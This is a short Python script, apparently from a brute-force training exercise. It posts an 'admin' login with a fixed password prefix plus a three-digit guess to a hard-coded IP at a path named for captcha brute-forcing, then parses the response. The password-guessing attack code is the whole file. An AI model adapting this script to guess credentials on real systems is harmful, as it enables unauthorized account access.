from urllib import request, parse
import bs4
from bs4 import BeautifulSoup

guess = "000"
vcode = 0

login_data = parse.urlencode([
    ('username', "admin"),
    ('password', "13680313"+guess),
    ('vcode', vcode)
])

req = request.Request('http://49.235.141.207:25504/1zonghe/baopo/yanzhengma/')
req.add_header('Referer', 'http://49.235.141.207:25504/1zonghe/baopo/yanzhengma/')
req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')

with request.urlopen(req, data=login_data.encode('utf-8')) as f:
    print('Status:', f.status, f.reason)
    for k, v in f.getheaders():
        print('%s: %s' % (k, v))
    html_doc = f.read().decode('utf-8')
    print('Data:', html_doc)


#创建一个BeautifulSoup解析对象
soup = BeautifulSoup(html_doc, "html.parser", from_encoding="utf-8")
